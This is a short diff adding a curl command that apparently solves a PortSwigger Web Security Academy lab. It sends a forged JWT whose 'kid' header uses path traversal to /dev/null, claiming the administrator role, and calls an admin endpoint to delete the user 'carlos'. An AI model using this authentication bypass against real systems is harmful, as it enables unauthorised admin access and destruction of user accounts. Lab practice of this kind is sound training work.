@@ -1,0 +1,2 @@
+curl -s "https://<lab-url>.web-security-academy.net/admin/delete?username=carlos" \
+  -b "session=eyJraWQiOiIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQwMTg5NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.0CPsUNxkYuo09m3xARyLb-_wJs-1KYsKS6rTcIxxT_o"
